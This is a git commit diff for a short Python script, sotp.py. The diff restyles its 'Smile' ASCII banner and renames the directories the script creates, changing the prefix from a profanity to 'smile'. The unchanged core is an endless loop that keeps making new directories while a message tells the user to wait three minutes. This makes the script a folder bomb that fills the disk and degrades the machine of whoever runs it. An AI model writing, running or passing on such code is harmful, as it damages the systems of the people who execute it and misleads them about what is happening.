422c67b8bdaf1f62cda2ef60672f95e37ff716a8
Cyber_smile_54x45 <87195969+C7836-5M1L3@users.noreply.github.com>
2021-10-16 11:25:40 +0530

    Update sotp.py

--- sotp.py
+++ sotp.py
@@ -2,16 +2,16 @@
 import os
 print("\033[1;32;40m   \n")
 print("\u001b[31m      \n")
-print('╔═══╗───╔╗')
-print('║╔═╗║───║║')
-print('║╚══╦╗╔╦╣║╔══╗')
-print('╚══╗║╚╝╠╣║║║═╣')
-print('║╚═╝║║║║║╚╣║═╣')
-print('╚═══╩╩╩╩╩═╩══╝\n\n')
-print('Wait a 3 minutes!')
+print('╭━━━╮╱╱╱╭╮   ')
+print('┃╭━╮┃╱╱╱┃┃   ')
+print('┃╰━━┳╮╭┳┫┃╭━━╮ ')
+print('╰━━╮┃╰╯┣┫┃┃┃━┫ ')
+print('┃╰━╯┃┃┃┃┃╰┫┃━┫ ')
+print('╰━━━┻┻┻┻┻━┻━━╯ \n\n')
+print('Wait a 3 minutes')
 
 import os
 i=0
 while True:
-    os.mkdir(f"fuckyou{i}")
+    os.mkdir(f"smile{i}")
     i+=1
